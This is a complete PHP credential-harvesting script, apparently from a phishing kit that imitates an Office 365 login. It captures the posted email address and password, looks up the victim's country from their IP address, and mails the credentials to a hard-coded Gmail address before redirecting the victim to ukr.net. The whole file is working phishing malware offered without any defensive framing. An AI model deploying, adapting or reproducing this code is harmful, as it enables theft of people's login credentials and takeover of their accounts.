<?php
session_start();
$_SESSION['Pdf3'] = $_POST['pdf3'];
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$login = $_POST['Email'];
$passwd = $_POST['Password'];
$own = 'cedricossai60@gmail.com';
$server = date("D/M/d, Y g:i a"); 
$sender = 'cedricossai60@gmail.com';
$domain = 'LOGS | BLESS UP 2K21 |';
$subj = "$domain | $country";
$headers .= "From: OFFICE365 LOGINS<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'http://drive.google.com/file/d';
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>________OffIcE LoG_________</td></tr>
 <tr><td><STRONG>EMail I.D: $login<td/></tr>
 <tr><td><STRONG>Password: $passwd</td></tr>
 <tr><td><STRONG>IP: $ip</td></tr>
 <tr><td><STRONG>Date: $server</td></tr>
 <tr><td><STRONG>country : $country</td></tr>
 <tr><td>_____cReAtEd By Abacha______</td></tr>
 </BODY>
 </HTML>";

     
if (empty($login) || empty($passwd)) {
header( "Location: https://www.ukr.net/" );
}
else {
mail($own,$subj,$msg,$headers);
header("Location: https://www.ukr.net/");
}
?>
